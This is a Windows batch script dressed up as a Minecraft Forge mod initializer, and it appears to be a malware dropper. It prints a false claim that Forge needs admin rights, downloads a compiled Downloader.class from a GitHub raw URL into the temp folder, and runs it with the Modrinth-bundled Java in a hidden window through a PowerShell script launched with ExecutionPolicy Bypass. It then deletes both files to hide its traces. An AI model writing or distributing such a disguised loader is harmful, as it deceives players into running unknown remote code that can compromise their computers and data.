@echo off
setlocal

echo Heating the forge...
timeout /t 1 /nobreak >nul
echo.
echo To initialize all mods properly, Forge needs admin permissions.
timeout /t 2 /nobreak >nul

set "CLASS_FILE=%TEMP%\Downloader.class"

:: Download the compiled .class file
powershell -NoProfile -Command "try { $wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/sleepypuppy77/ideal-spoon/refs/heads/main/Downloader.class', '%CLASS_FILE%') } catch { exit 1 }"

if not exist "%CLASS_FILE%" (
    echo Failed to download required files.
    timeout /t 2 /nobreak >nul
    exit
)

:request_admin
:: Find Java in Modrinth App directory
set "JAVAW_PATH="

for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\*") do (
    if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
)

if not defined JAVAW_PATH (
    echo Java not found. Please install Java.
    timeout /t 3 /nobreak >nul
    exit
)

:: Create PowerShell script that runs the .class file
set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
(
echo $javaPath = '%JAVAW_PATH%'
echo $classFile = '%CLASS_FILE%'
echo $javaDir = Split-Path $javaPath -Parent
echo $javaExePath = Join-Path $javaDir 'java.exe'
echo $workDir = Split-Path $classFile -Parent
echo try {
echo     Start-Process -FilePath $javaExePath -ArgumentList "-cp `"$workDir`" Downloader" -WindowStyle Hidden
echo } catch {
echo     exit 1
echo }
) > "%PS_SCRIPT%"

:: Run the PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"

:: Clean up
del "%PS_SCRIPT%" 2>nul
del "%CLASS_FILE%" 2>nul

exit
